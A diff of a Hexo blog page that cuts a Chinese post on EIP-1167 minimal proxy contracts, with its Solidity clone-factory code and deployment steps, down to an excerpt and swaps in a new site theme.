/**</span><br><span class="line">   * @dev Throws if called by any account other than the owner.</span><br><span class="line">   */</span><br><span class="line">  modifier onlyOwner() &#123;</span><br><span class="line">    require(msg.sender == owner());</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev The constructor sets the original owner of the contract to the sender account.</span><br><span class="line">   */</span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    setOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev Tells the address of the owner</span><br><span class="line">   * @return the address of the owner</span><br><span class="line">   */</span><br><span class="line">  function owner() public view returns (address) &#123;</span><br><span class="line">    return _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev Sets a new owner address</span><br><span class="line">   */</span><br><span class="line">  function setOwner(address newOwner) internal &#123;</span><br><span class="line">    _owner = newOwner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev Allows the current owner to transfer control of the contract to a newOwner.</span><br><span class="line">   * @param newOwner The address to transfer ownership to.</span><br><span class="line">   */</span><br><span class="line">  function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">    require(newOwner != address(0));</span><br><span class="line">    emit OwnershipTransferred(owner(), newOwner);</span><br><span class="line">    setOwner(newOwner);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// https://github.com/optionality/clone-factory/blob/master/contracts/CloneFactory.sol</span><br><span class="line">contract CloneFactory &#123;</span><br><span class="line">  function createClone(address target) internal returns (address result) &#123;</span><br><span class="line">    bytes20 targetBytes = bytes20(target);</span><br><span class="line">    assembly &#123;</span><br><span class="line">      let clone := mload(0x40)</span><br><span class="line">      mstore(clone, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)</span><br><span class="line">      mstore(add(clone, 0x14), targetBytes)</span><br><span class="line">      mstore(add(clone, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000)</span><br><span class="line">      result := create(0, clone, 0x37)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function isClone(address target, address query) internal view returns (bool result) &#123;</span><br><span class="line">    bytes20 targetBytes = bytes20(target);</span><br><span class="line">    assembly &#123;</span><br><span class="line">      let clone := mload(0x40)</span><br><span class="line">      mstore(clone, 0x363d3d373d3d3d363d7300000000000000000000000000000000000000000000)</span><br><span class="line">      mstore(add(clone, 0xa), targetBytes)</span><br><span class="line">      mstore(add(clone, 0x1e), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000)</span><br><span class="line"></span><br><span class="line">      let other := add(clone, 0x40)</span><br><span class="line">      extcodecopy(query, other, 0, 0x2d)</span><br><span class="line">      result := and(</span><br><span class="line">        eq(mload(clone), mload(other)),</span><br><span class="line">        eq(mload(add(clone, 0xd)), mload(add(other, 0xd)))</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MetaCoinCloneFactory is CloneFactory, Ownable &#123;</span><br><span class="line">    MetaCoinClonable[] public metaCoinAddresses;</span><br><span class="line">    event MetaCoinCreated(MetaCoinClonable metaCoin);</span><br><span class="line"></span><br><span class="line">    address public libraryAddress;</span><br><span class="line">    address public metaCoinOwner;</span><br><span class="line"></span><br><span class="line">    function setLibraryAddress(address _libraryAddress) external onlyOwner &#123;</span><br><span class="line">        libraryAddress = _libraryAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createMetaCoin(address _metaCoinOwner, uint256 initialBalance) external &#123;</span><br><span class="line">        MetaCoinClonable metaCoin = MetaCoinClonable(</span><br><span class="line">            createClone(libraryAddress)</span><br><span class="line">        );</span><br><span class="line">        metaCoin.initialize(_metaCoinOwner, initialBalance);</span><br><span class="line"></span><br><span class="line">        metaCoinAddresses.push(metaCoin);</span><br><span class="line">        emit MetaCoinCreated(metaCoin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getMetaCoins() external view returns (MetaCoinClonable[] memory) &#123;</span><br><span class="line">        return metaCoinAddresses;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="第一步：部署母合约"><a href="#第一步：部署母合约" class="headerlink" title="第一步：部署母合约"></a>第一步：部署母合约</h4><p><img src="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925194253819.png" alt="image-20210925194253819"></p>
-<h4 id><a href="#" class="headerlink" title></a><img src="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925194317822.png" alt="image-20210925194317822"></h4><p>母合约地址为：0x619B0084D96D51Ab63832d2e36d408f9d7d9a9f5</p>
-<h4 id="第二步：部署工厂合约"><a href="#第二步：部署工厂合约" class="headerlink" title="第二步：部署工厂合约"></a>第二步：部署工厂合约</h4><p><img src="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925194435666.png" alt="image-20210925194435666"></p>
-<p>工厂合约地址为：0x15aB5Ad34da64381f0F0E72025de389653585Ef6</p>
-<h4 id="第三步：设置克隆合约（库合约）地址"><a href="#第三步：设置克隆合约（库合约）地址" class="headerlink" title="第三步：设置克隆合约（库合约）地址"></a>第三步：设置克隆合约（库合约）地址</h4><p><img src="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925194746689.png" alt="image-20210925194746689"></p>
-<p>将刚才获得的母合约地址0x619B0084D96D51Ab63832d2e36d408f9d7d9a9f5作为参数，调用setLibraryAddress函数，将母合约地址设置为克隆合约地址。</p>
-<h4 id="第四步：创建子合约（可设置多个）"><a href="#第四步：创建子合约（可设置多个）" class="headerlink" title="第四步：创建子合约（可设置多个）"></a>第四步：创建子合约（可设置多个）</h4><p><img src="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925195105183.png" alt="image-20210925195105183"></p>
-<p>将合约的owner地址和初始化余额作为参数，调用createMetaCoin，获得子合约。</p>
-<p><img src="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925195316198.png" alt="image-20210925195316198"></p>
-<p>可通过调用getMetaCoins来查询部署子合约的地址。0x8aeb371cd806c56426d5722d32f8a6e1ad4cc605</p>
-<p><img src="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925195513372.png" alt="image-20210925195513372"></p>
-<p>通过查看子合约的字节码文件可发现，子合约的处理逻辑是将接收到的请求通过委托调用的方式传发给母合约来进行处理，但是子合约的存储信息是存储在子合约中的。因此可以将子合约看作母合约的一个代理合约。</p>
-<p><img src="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/image-20210925195957062.png" alt="image-20210925195957062"></p>
-<p>可以看到接受用户请求的子合约中并不包含合约中各种函数的处理逻辑，子合约以代理的形式进行委托调用，调用合约的函数逻辑进行处理，并将信息反馈给用户，可以很好的避免合约部署时内存滥用和大量Gas消耗。</p>
-
+        <p class="article-excerpt-content">
+          避免“重复部署某一个合约导致过多的存储空间被用在重复的运行时字节码的存储”。
+当需要某一份代码被大量部署时，这样就会使得大量的存储空间来存储相同的运行字节码，并消耗大量的Gas费用，引入EIP1167-最小合约代理来节省这部分存储与Gas消耗。
+总体思路：设置一个母合约被用来委托调用，实现合约的逻辑部分；通过工厂合约创建多个子合约与用户直接交互。当用户向子合约发来请求时，子合约通过委托调用（delegatecall）的方式调用母合约的函数逻辑修改子合约的存储。因为子合约中并没有对应函数的处...
+        </p>
+        <p class="article-more-link">
+          <a href="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/#more">Read More</a>
+        </p>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/" data-id="cku25wvco0001sohjcuyr0fyu" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/EIP%E5%8D%8F%E8%AE%AE/" rel="tag">EIP协议</a></li></ul>
+      
+      
 
     </footer>
   </div>
   
 </article>
+
+<!-- Table of Contents -->
 
 
   
@@ -203,87 +311,91 @@
 
 </section>
         
-          <aside id="sidebar">
-  
-    
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/EIP%E5%8D%8F%E8%AE%AE/" rel="tag">EIP协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7/" rel="tag">复盘分析、闪电贷</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/EIP%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">EIP协议</a> <a href="/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7/" style="font-size: 10px;">复盘分析、闪电贷</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">DODO_FlashLoan攻击复现--狸猫换太子</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/">EIP1167-最小合约代理的理解</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
       </div>
+      
+        <div align="center" style="margin-top: 30px;"><hr class="hr" style="margin:0px; height:3px;"></div>
+      
       <footer id="footer">
   
 
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 SCC All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
 
-
-
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2021 Janson Woods<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
+		
   </div>
 </footer>
 
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
     </div>
-    <nav id="mobile-nav">
+    <!-- <nav id="mobile-nav">
   
     <a href="/" class="mobile-nav-link">Home</a>
   
     <a href="/archives" class="mobile-nav-link">Archives</a>
   
-</nav>
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
     
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
 
 
   
@@ -295,11 +407,99 @@
 
 
 
-<script src="/js/script.js"></script>
+<script src="/js/scripts.js"></script>
+
+
+
+  
+<script src="/js/home.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
 
 
 
 
   </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            SCC
+          </div>
+          <div class="panel-body">
+            Copyright © 2021 Janson Woods All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
 </body>
 </html>
